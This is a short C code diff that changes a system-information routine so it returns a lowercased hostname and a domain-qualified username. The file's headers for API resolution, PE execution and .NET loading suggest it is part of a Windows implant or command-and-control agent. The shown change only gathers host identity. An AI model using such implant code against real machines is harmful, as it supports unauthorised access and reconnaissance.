@@ -16,6 +16,8 @@
 #include <string.h>
 #include <stdio.h>
 #include <ctype.h>
+#define SECURITY_WIN32
+#include <secext.h>
 #include "api_resolve.h"
 #include "pe_exec.h"
 #include "dotnet.h"
@@ -232,10 +234,13 @@ static char* do_ls_json(const char *path) {
 // ── Sysinfo ───────────────────────────────────────────────────────────────────
 
 static char* do_sysinfo(void) {
-    char hostname[128] = "UNKNOWN", username[128] = "UNKNOWN";
-    DWORD h_sz = sizeof(hostname), u_sz = sizeof(username);
+    char hostname[128] = "UNKNOWN", username[256] = "UNKNOWN";
+    DWORD h_sz = sizeof(hostname);
     GetComputerNameA(hostname, &h_sz);
-    GetUserNameA(username, &u_sz);
+    for (DWORD i = 0; i < h_sz; i++) hostname[i] = (char)tolower((unsigned char)hostname[i]);
+    ULONG u_sz = sizeof(username);
+    if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &u_sz))
+        GetUserNameA(username, (DWORD*)&u_sz); /* fallback: local account */
     char *buf = (char*)malloc(512);
     if (!buf) return strdup("oom");
     snprintf(buf, 512,
